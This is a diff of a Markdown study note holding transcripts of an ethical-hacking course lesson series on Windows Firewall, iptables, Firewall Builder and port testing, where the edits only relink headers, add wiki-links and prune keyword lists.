@@ -99,14 +99,13 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Finding weaknesses in the perimeter
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980)
+#### [Finding weaknesses in the perimeter](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980)
 
 > [!transcript]- Transcript
 >
 > **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=1)** - [Malcom] While many cyber attacks may start with social engineering, the actual breach occurs after the malware or an intruder has got inside the perimeter.
 >
-> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=10)** Consequently, businesses place a lot of emphasis on using firewalls, intrusion detection systems, and sometimes Honeypots to protect the perimeter.
+> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=10)** Consequently, businesses place a lot of emphasis on using firewalls, [[Intrusion Detection]] systems, and sometimes Honeypots to protect the perimeter.
 >
 > **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/finding-weaknesses-in-the-perimeter?u=76281980&t=20)** In this course, I'll cover the major perimeter protection devices.
 >
@@ -122,12 +121,11 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (3), [[Intrusion Detection]] (2), [[Engineering]] (1), web application (1), api (1)
+> **Frameworks & Libraries:** [[Intrusion Detection]] (2)
 > **Env Vars:** api (1)
 > **Speakers:** - [malcom] (1)
 
-#### What you should know
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980)
+#### [What you should know](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -135,29 +133,28 @@ created: 2026-05-02
 >
 > **[0:02](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=2)** And during this course, I'll be setting up and using tools to interact with perimeter devices, such as firewalls and IDS.
 >
-> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=10)** I'll be using the VirtualBox environment, and you should be familiar with using Kali Linux and its terminal shell, and the Windows command shell.
+> **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=10)** I'll be using the VirtualBox environment, and you should be familiar with using [[Kali Linux]] and its terminal shell, and the [[Windows]] command shell.
 >
-> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=19)** We'll also be working at the IPv4 network level and you'll want to be familiar with networking concepts, particularly around addressing import management and basic networking tools such as netcat and Nmap.
+> **[0:19](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=19)** We'll also be working at the IPv4 network level and you'll want to be familiar with networking concepts, particularly around addressing import management and basic networking tools such as [[Netcat]] and [[Nmap]].
 >
 > **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/what-you-should-know?u=76281980&t=33)** We'll also be touching on the Cisco IOS operating system and we'll use a number of tools for perimeter defense testing but you'll learn about those during the course.
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Kali Linux]] (1), [[Windows]] (1), management (1)
+> **Frameworks & Libraries:** [[Kali Linux]] (1), [[Windows]] (1), [[Netcat]] (1), [[Nmap]] (1)
 > **Env Vars:** ids (1), ios (1)
 > **Analogies:** such as (2)
 > **Tools:** terminal (1)
 > **Definitions:** is a  (1)
 > **Speakers:** - [instructor] (1)
 
-#### Course disclaimer
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980)
+#### [Course disclaimer](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of ethical hacking courses, and it uses a range of third-party testing tools.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=0)** - [Instructor] This is one of a series of [[Ethical Hacking]] courses, and it uses a range of third-party testing tools.
 >
-> **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=6)** Some are commercial products, and some are open-source.
+> **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=6)** Some are commercial [[Microsoft Products|products]], and some are open-source.
 >
 > **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/course-disclaimer?u=76281980&t=10)** The download and installation instructions for all tools used in this course are available as a PDF in the associated course material.
 >
@@ -179,7 +176,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Ethical Hacking]] (1), [[Microsoft Products|Products]] (1), open-source (1)
+> **Frameworks & Libraries:** [[Ethical Hacking]] (1), [[Microsoft Products|Products]] (1)
 > **Env Vars:** pdf (1)
 > **Speakers:** - [instructor] (1)
 
@@ -188,8 +185,7 @@ created: 2026-05-02
 
 [↑ Back to Table of Contents](#table-of-contents)
 
-#### Understanding Firewalls
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980)
+#### [Understanding Firewalls](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -197,7 +193,7 @@ created: 2026-05-02
 >
 > **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=10)** A key control to prevent this is the use of perimeter firewalls.
 >
-> **[0:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=14)** These come in two forms: personal firewalls and endpoint devices and enterprise firewalls to protect business enclaves.
+> **[0:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=14)** These come in two [[Forms]]: personal firewalls and endpoint devices and enterprise firewalls to protect business enclaves.
 >
 > **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=22)** These operate in essentially the same way.
 >
@@ -209,22 +205,21 @@ created: 2026-05-02
 >
 > **[0:52](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=52)** Firewalls can be built into operating systems or can be standalone devices.
 >
-> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=57)** Let's start by looking at the firewalls built into Windows and Linux.
+> **[0:57](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understanding-firewalls?u=76281980&t=57)** Let's start by looking at the firewalls built into [[Windows]] and [[Linux]].
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** business (2), web (1), [[Forms]] (1), [[Windows]] (1), [[Linux]] (1)
+> **Frameworks & Libraries:** [[Forms]] (1), [[Windows]] (1), [[Linux]] (1)
 > **Analogies:** such as (1)
 > **Speakers:** - [instructor] (1)
 
-#### Apply the basics of the Windows firewall
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980)
+#### [Apply the basics of the Windows firewall](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=1)** - [Instructor] To find the Windows Firewall, I'll click on the Windows button, Settings, Updates and Security, and Windows Security and I'll open Windows Security.
+> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=1)** - [Instructor] To find the [[Windows]] Firewall, I'll click on the Windows button, Settings, Updates and Security, and Windows Security and I'll open Windows Security.
 >
-> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=17)** This might be called the Windows Defender Security Center on your system.
+> **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=17)** This might be called the Windows [[Microsoft Defender|Defender]] Security Center on your system.
 >
 > **[0:22](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=22)** I'll select Firewall and Network protection.
 >
@@ -262,7 +257,7 @@ created: 2026-05-02
 >
 > **[2:37](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=157)** I'll browse to my Tools/mmap directory and select mmap.exe.
 >
-> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=165)** If I press Network types, we can see that the Microsoft firewall defaults new programs to the private network only.
+> **[2:45](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=165)** If I press Network types, we can see that the [[Microsoft]] firewall defaults new programs to the private network only.
 >
 > **[2:53](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=173)** That's fine, so let's now press OK, and then Add.
 >
@@ -272,7 +267,7 @@ created: 2026-05-02
 >
 > **[3:04](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=184)** So Windows Firewall allows us to control which programs can accept connections from another computer when we're on our home network and which connections are accepted when we go out with our laptop and connect to a public network.
 >
-> **[3:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=197)** Most computers come with a network communications tool called netcat, which we can use to communicate between two computers, one being a sender and the other a listener.
+> **[3:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=197)** Most computers come with a network communications tool called [[Netcat]], which we can use to communicate between two computers, one being a sender and the other a listener.
 >
 > **[3:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/apply-the-basics-of-the-windows-firewall?u=76281980&t=208)** I'll use this program to demonstrate the features of the Windows Firewall by communicating to this computer remotely.
 >
@@ -300,7 +295,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (11), [[Security]] (5), [[Microsoft Defender|Defender]] (2), [[Microsoft]] (1), prompt (1)
+> **Frameworks & Libraries:** [[Windows]] (11), [[Netcat]] (4), [[Microsoft Defender|Defender]] (2), [[Microsoft]] (1)
 > **UI Navigation:** click on (4), scroll down (2), open the (1), select the (1)
 > **Prerequisites:** set up (2), configure (1)
 > **CLI Commands:** find (2)
@@ -309,18 +304,17 @@ created: 2026-05-02
 > **Versions:** 192.168.1 (1)
 > **Cross-References:** go back to (1)
 
-#### Use advanced features in the Windows Firewall
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980)
+#### [Use advanced features in the Windows Firewall](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=1)** - [Instructor] Now that we've looked at the basic operation of Windows Firewall, let's take a look at the advanced settings.
+> **[0:01](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=1)** - [Instructor] Now that we've looked at the basic operation of [[Windows]] Firewall, let's take a look at the advanced settings.
 >
 > **[0:08](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=8)** At the Firewall and Network Protection screen, I can see I'm on a public network.
 >
 > **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=15)** I'll select advanced settings.
 >
-> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=20)** This brings me to the Windows Defender Firewall with Advanced Security screen.
+> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=20)** This brings me to the Windows [[Microsoft Defender|Defender]] Firewall with Advanced Security screen.
 >
 > **[0:26](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=26)** This is intended for system administrators in an enterprise network.
 >
@@ -328,7 +322,7 @@ created: 2026-05-02
 >
 > **[0:40](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=40)** The various functions in this screen can be accessed through the rule items on the left, the properties links in the middle panel or from the actions links on the right.
 >
-> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=50)** Advanced security allows us to apply specific restrictions to connections and also provides three additional features which are useful in an enterprise configuration, ensuring computers authenticate to each other before they connect, that data integrity is checked on all communications received and that data is encrypted during transmission.
+> **[0:50](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=50)** Advanced security allows us to apply specific restrictions to connections and also provides three additional features which are useful in an enterprise configuration, ensuring computers authenticate to each other before they connect, that [[Data Integrity]] is checked on all communications received and that data is encrypted during transmission.
 >
 > **[1:14](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=74)** We've already looked at connections which are allowed or blocked, but Windows Firewall can also configure a connection to be allowed only if it's secured by using the IP Set Protocol.
 >
@@ -348,7 +342,7 @@ created: 2026-05-02
 >
 > **[2:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=130)** I'll select no for this and then press okay to close the window.
 >
-> **[2:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=137)** I removed netcat from the list of approved apps.
+> **[2:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=137)** I removed [[Netcat]] from the list of approved apps.
 >
 > **[2:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=140)** I'll check my IP address and set up the netcat listener at the Windows command prompt.
 >
@@ -426,7 +420,7 @@ created: 2026-05-02
 >
 > **[7:30](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=450)** We get the response as expected.
 >
-> **[7:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=453)** I'll now try to connect from my ubuntu system.
+> **[7:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=453)** I'll now try to connect from my [[Ubuntu]] system.
 >
 > **[7:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/use-advanced-features-in-the-windows-firewall?u=76281980&t=459)** I can see I'm on IP address 10.0.2.12.
 >
@@ -442,7 +436,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (13), [[Microsoft Defender|Defender]] (2), [[Security]] (2), data (2), management (1)
+> **Frameworks & Libraries:** [[Windows]] (13), [[Netcat]] (8), [[Microsoft Defender|Defender]] (2), [[Data Integrity]] (1), [[Ubuntu]] (1)
 > **UI Navigation:** click on (6), select the (2), switch to (1)
 > **Versions:** 10.0.2 (4), 10.0.1 (1), 2.24 (1)
 > **Prerequisites:** set up (4), configure (1)
@@ -451,12 +445,11 @@ created: 2026-05-02
 > **Env Vars:** udp (1)
 > **Cross-References:** go back to (1)
 
-#### Review firewall logs
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980)
+#### [Review firewall logs](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=0)** - [Instructor] The Windows Firewall maintains a log of all allowed and blocked connections but this can become quite a large text file which is somewhat difficult to use.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=0)** - [Instructor] The [[Windows]] Firewall maintains a log of all allowed and blocked connections but this can become quite a large text file which is somewhat difficult to use.
 >
 > **[0:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=10)** The ZedLan analyzer for Windows Firewall logs provides a more manageable interface for log viewing and analysis.
 >
@@ -480,7 +473,7 @@ created: 2026-05-02
 >
 > **[1:10](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=70)** This takes a little time but it can be useful for making sense of the log entries.
 >
-> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=75)** The Continuous Refresh setting is useful if we want to maintain a real-time display of logging.
+> **[1:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=75)** The Continuous Refresh setting is useful if we want to maintain a [[Real-Time]] display of logging.
 >
 > **[1:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/review-firewall-logs?u=76281980&t=80)** ZedLan allows some protocols and packets to be excluded from the analysis.
 >
@@ -522,7 +515,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Windows]] (3), [[Real-Time]] (1), management (1), data (1), traffic (1)
+> **Frameworks & Libraries:** [[Windows]] (3), [[Real-Time]] (1)
 > **Env Vars:** tcp (2), info (1), events (1), lost (1)
 > **UI Navigation:** navigate to (1), select the (1), checkbox (1), click on (1)
 > **CLI Commands:** make (1)
@@ -531,16 +524,15 @@ created: 2026-05-02
 > **Warnings:** warning (1)
 > **Speakers:** - [instructor] (1)
 
-#### Understand Linux IPTables
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980)
+#### [Understand Linux IPTables](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=0)** - [Narrator] Linux provides basic firewall capability through the use of a program called iptables.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=0)** - [Narrator] [[Linux]] provides basic firewall capability through the use of a program called iptables.
 >
 > **[0:06](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=6)** Iptables is one of the set of rule based firewall modules in Linux, the other being ip6tables, arptables, and ebtables.
 >
-> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=15)** Let's check what rules we have set up in the iptables firewall in our Ubuntu system.
+> **[0:15](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=15)** Let's check what rules we have set up in the iptables firewall in our [[Ubuntu]] system.
 >
 > **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=24)** The command my minus L tells iptables to list its rules.
 >
@@ -566,7 +558,7 @@ created: 2026-05-02
 >
 > **[1:23](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=83)** Okay, we can see our IP address is 10.0.2.19.
 >
-> **[1:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=88)** I'll demonstrate the use of firewall rules by setting up a netcat listener.
+> **[1:28](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=88)** I'll demonstrate the use of firewall rules by setting up a [[Netcat]] listener.
 >
 > **[1:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/understand-linux-iptables?u=76281980&t=93)** Netcat is now listening for data to come in on port 4545.
 >
@@ -626,7 +618,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Ubuntu]] (4), data (4), traffic (3), [[Linux]] (2)
+> **Frameworks & Libraries:** [[Ubuntu]] (4), [[Netcat]] (4), [[Linux]] (2)
 > **Prerequisites:** set up (3), setup (2)
 > **CLI Commands:** sudo (3), make (1)
 > **Ports:** port 4545 (3), port 4546 (1)
@@ -634,12 +626,11 @@ created: 2026-05-02
 > **Env Vars:** tcp (2)
 > **Speakers:** - [narrator] (1)
 
-#### Set up an IPTables firewall
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980)
+#### [Set up an IPTables firewall](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980)
 
 > [!transcript]- Transcript
 >
-> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=0)** - [Instructor] The power of IP tables enables the deployment of quite capable Linux firewall appliances.
+> **[0:00](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=0)** - [Instructor] The power of IP tables enables the deployment of quite capable [[Linux]] firewall appliances.
 >
 > **[0:07](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/set-up-an-iptables-firewall?u=76281980&t=7)** While developing a fully configured Linux firewall is out of scope for this course, it is useful to understand how this is done to support testing of such devices.
 >
@@ -687,7 +678,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** management (3), traffic (3), [[Linux]] (2), web (2), concurrent (2)
+> **Frameworks & Libraries:** [[Linux]] (2)
 > **Ports:** port 443 (2), port 80 (1), port 4545 (1), port 22 (1)
 > **Env Vars:** ssh (2), http (1), https (1), ipt (1)
 > **CLI Commands:** ssh (2), sudo (1)
@@ -696,8 +687,7 @@ created: 2026-05-02
 > **Definitions:** is a  (1)
 > **Speakers:** - [instructor] (1)
 
-#### Manage rules with Firewall Builder
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980)
+#### [Manage rules with Firewall Builder](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -707,7 +697,7 @@ created: 2026-05-02
 >
 > **[0:18](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=18)** It doesn't change the way in which the firewall operates, but it does provide a simple way of expressing rules to make it much easier to understand them.
 >
-> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=27)** It supports a range of Linux and Cisco firewall platforms and provides a validation function to check for invalid rules, and issues such as rule shadowing, where a rule will never be executed due to a prior rule.
+> **[0:27](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=27)** It supports a range of [[Linux]] and Cisco firewall platforms and provides a validation function to check for invalid rules, and issues such as rule shadowing, where a rule will never be executed due to a prior rule.
 >
 > **[0:41](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=41)** Part of the pen tester's role is to check firewall rule sets and determine whether they provide open pathways to a target network.
 >
@@ -741,7 +731,7 @@ created: 2026-05-02
 >
 > **[2:39](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=159)** This can be useful when testing to confirm that all connected devices are known.
 >
-> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=164)** In Firewall Builder, each firewall object has several sets of rules associated with it, access policy rules, network address translation rules, and routing rules.
+> **[2:44](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=164)** In Firewall Builder, each firewall object has several sets of rules associated with it, access policy rules, network address translation rules, and [[Routing]] rules.
 >
 > **[2:55](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/manage-rules-with-firewall-builder?u=76281980&t=175)** Access policy rules filter traffic, controlling access to and from the firewall and the network behind it.
 >
@@ -831,7 +821,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Security]] (3), [[Routing]] (2), traffic (2), next (2), [[Linux]] (1)
+> **Frameworks & Libraries:** [[Routing]] (2), [[Linux]] (1)
 > **Env Vars:** icmp (4), dmz (3), nat (2), asa (2), dns (1)
 > **Versions:** 255.255.255 (4), 10.0.0 (3), 192.168.1 (2), 176.0.2 (1), version 8 (1)
 > **UI Navigation:** click on (2), select the (2), open the (1), drag and drop (1), scroll down (1)
@@ -840,8 +830,7 @@ created: 2026-05-02
 > **Code Identifiers:** ios (2)
 > **Analogies:** such as (1), for example (1)
 
-#### Port testing
-> [LinkedIn Learning](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980)
+#### [Port testing](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980)
 
 > [!transcript]- Transcript
 >
@@ -851,9 +840,9 @@ created: 2026-05-02
 >
 > **[0:17](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=17)** This tool can be downloaded from the site shown.
 >
-> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=20)** It's a zip file containing a Java JAR executable.
+> **[0:20](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=20)** It's a zip file containing a [[Java]] JAR executable.
 >
-> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=24)** I have the port tester loaded on my Windows 7 system, so let's use it to look at the Metasploit server.
+> **[0:24](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=24)** I have the port tester loaded on my [[Windows]] 7 system, so let's use it to look at the [[Metasploit]] server.
 >
 > **[0:33](https://www.linkedin.com/learning/ethical-hacking-evading-ids-firewalls-and-honeypots/port-testing?u=76281980&t=33)** The tool displays a window in which we can enter a URL and port numbers, and it will run a very quick check to see if these are open.
 >
@@ -871,7 +860,7 @@ created: 2026-05-02
 
 > [!info]- Semantic Content
 >
-> **Frameworks & Libraries:** [[Java]] (1), [[Windows]] (1), dns (1)
+> **Frameworks & Libraries:** [[Metasploit]] (2), [[Java]] (1), [[Windows]] (1)
 > **Env Vars:** url (3), jar (1), dns (1)
 > **Ports:** port 53 (1)
 > **Exercise Files:** zip file (1)
@@ -883,14 +872,13 @@ created: 2026-05-02
 
